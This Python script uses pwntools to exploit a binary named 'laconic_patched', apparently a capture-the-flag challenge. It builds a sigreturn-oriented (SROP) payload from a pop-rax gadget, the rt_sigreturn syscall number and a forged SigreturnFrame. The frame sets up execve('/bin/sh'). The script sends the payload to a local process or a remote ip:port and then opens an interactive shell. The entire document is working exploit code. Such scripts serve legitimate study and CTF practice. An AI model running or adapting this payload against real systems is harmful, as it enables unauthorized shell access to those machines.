#!/usr/bin/env python3
# Good one for SROP

from pwn import *

e = ELF("./laconic_patched")
# libc = elf('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']


def conn():
    if args.LOCAL:
        r = process([e.path])
    elif args.GDB:
          # TODO: add break points, e.g. b *(_main + 0x12)
        r = gdb.debug([e.path], '''
                      b _start
                      ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    rop = ROP(e)
    bin_sh = 0x43238 # find via `grep '/bin/sh'` in GEF
    syscall = rop.find_gadget(['syscall'])[0]
    sigret_frame = SigreturnFrame()
    sigret_frame.rax = 59
    sigret_frame.rdx = 0
    sigret_frame.rdi = bin_sh
    sigret_frame.rsi = 0
    sigret_frame.rip = syscall
    pop_rax = 0x43018 # find via `ROPgadget --binary`
    payload = flat(
            p64(0),
            pop_rax,
            p64(15),
            syscall,
            sigret_frame,
            )
    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
